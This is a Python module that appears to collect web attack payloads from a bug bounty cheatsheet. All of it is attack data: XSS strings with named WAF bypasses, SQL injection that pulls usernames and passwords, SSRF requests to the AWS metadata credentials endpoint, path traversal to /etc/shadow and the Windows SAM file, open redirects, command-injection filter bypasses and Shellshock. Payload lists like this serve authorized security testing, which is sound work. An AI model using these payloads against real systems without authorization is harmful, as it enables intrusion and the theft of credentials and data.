"""
Payloads and techniques for vulnerability testing.
Source: EdOverflow/bugbounty-cheatsheet
https://github.com/EdOverflow/bugbounty-cheatsheet
"""

# XSS Payloads
XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
    ],
    "chrome_bypass": [
        "<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>",
        "<script src=\"data:,alert(1)%250A-->",
        "<script>alert(1)</script",
        "<script>alert(1)%0d%0a-->%09</script",
        "<x>%00%00%00%00%00%00%00<script>alert(1)</script>",
    ],
    "safari": [
        "<script>location.href;'javascript:alert%281%29'</script>",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()///>",
    ],
    "waf_bypass": [
        "\\');confirm(1);//",  # Kona/Akamai
        "<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>",  # ModSecurity
        "<meter onmouseover=\"alert(1)\"",  # Wordfence
        "'>><div><meter onmouseover=\"alert(1)\"</div>\"",  # Wordfence
        ">><marquee loop=1 width=0 onfinish=alert(1)>",  # Wordfence
        "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>",  # Incapsula
        "<img/src=q onerror='new Function`al\\ert\\`1\\``'>",  # Incapsula
    ],
    "url_based": [
        "javas&#x09;cript://www.google.com/%0Aalert(1)",
    ],
    "markdown": [
        "[a](javascript:confirm(1))",
    ],
}

# SQL Injection Payloads
SQLI_PAYLOADS = {
    "basic": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin' #",
        "admin'/*",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
    ],
    "blind": [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('test'))--",
    ],
    "akamai_bypass": [
        "444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/'p'/**/#",
        "' MID(CURRENT_USER,1,1) LIKE 'p'",
    ],
    "common_tables": [
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
    ],
}

# SSRF Payloads
SSRF_PAYLOADS = {
    "localhost": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://127.001/",
        "http://0177.1/",
        "http://0x7f.1/",
        "http://127.000.000.1",
        "https://520968996",
        "http://[::1]/",
        "http://[::]/ ",
    ],
    "aws_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/local-hostname",
        "http://169.254.169.254/latest/meta-data/public-hostname",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ],
    "wildcard_dns": [
        "10.0.0.1.xip.io",
        "www.10.0.0.1.xip.io",
        "10.0.0.1.nip.io",
        "app.10.0.0.1.nip.io",
    ],
    "exotic_handlers": [
        "gopher://localhost/",
        "dict://localhost/",
        "php://localhost/",
        "jar://localhost/",
        "tftp://localhost/",
    ],
    "ipv6": [
        "http://[::1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[::]/ ",
    ],
}

# LFI Payloads
LFI_PAYLOADS = {
    "basic": [
        "../../../etc/passwd",
        "../../etc/passwd",
        "../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
    ],
    "filter_bypass": [
        "../\\",
        "..\/",
        "//..",
        "\/..\" ",
        "/%5c..",
    ],
    "common_files": [
        "../../etc/passwd",
        "../../etc/shadow",
        "../../etc/hosts",
        "../../windows/win.ini",
        "../../windows/system32/config/sam",
        "../../proc/self/environ",
        "../../proc/self/cmdline",
    ],
    "log_files": [
        "../../var/log/apache2/access.log",
        "../../var/log/apache2/error.log",
        "../../var/log/nginx/access.log",
    ],
}

# Open Redirect Payloads
OPEN_REDIRECT_PAYLOADS = {
    "basic": [
        "//google.com",
        "//www.google.com",
        "///google.com",
        "////google.com",
    ],
    "encoding": [
        "/%09/google.com",
        "/%5cgoogle.com",
        "//www.google.com/%2f%2e%2e",
        "//www.google.com/%2e%2e",
        "//google.com/%2f..",
        "//\\google.com",
    ],
    "parameters": [
        "?url=http://google.com",
        "?url=https://google.com",
        "?url=//google.com",
        "?next=http://google.com",
        "?next=https://google.com",
        "?next=//google.com",
        "?redirect=http://google.com",
        "?return=http://google.com",
        "?link=http://google.com",
        "?continue=http://google.com",
    ],
    "paths": [
        "/redirect/google.com",
        "/cgi-bin/redirect.cgi?google.com",
        "/out/google.com",
    ],
}

# RCE Payloads
RCE_PAYLOADS = {
    "basic": [
        "ls -la",
        "id",
        "whoami",
        "pwd",
        "uname -a",
    ],
    "bypass": [
        "i'''d",
        'i"""d',
        "\\l\\s -l\\a\\h",
        "cat /e?c/p?ss??",
        "cat /e??/??ss*",
        "{ls,}",
        "{ls,-a}",
    ],
    "shellshock": [
        "() { :;}; echo vulnerable",
    ],
    "werkzeug": [
        "strіng",  # Causes debugger error in debug mode
    ],
}

# Additional Parameters to Test
COMMON_REDIRECT_PARAMS = [
    "url",
    "next",
    "return",
    "redirect",
    "continue",
    "link",
    "go",
    "forward",
    "ref",
    "referrer",
    "ret",
    "target",
    "destination",
    "page",
]

COMMON_SSRF_PARAMS = [
    "url",
    "uri",
    "link",
    "redirect",
    "image",
    "path",
    "file",
    "proxy",
    "fetch",
    "download",
    "load",
]

COMMON_LFI_PARAMS = [
    "file",
    "path",
    "page",
    "document",
    "dir",
    "directory",
    "folder",
    "include",
    "load",
    "view",
    "display",
    "url",
    "uri",
]
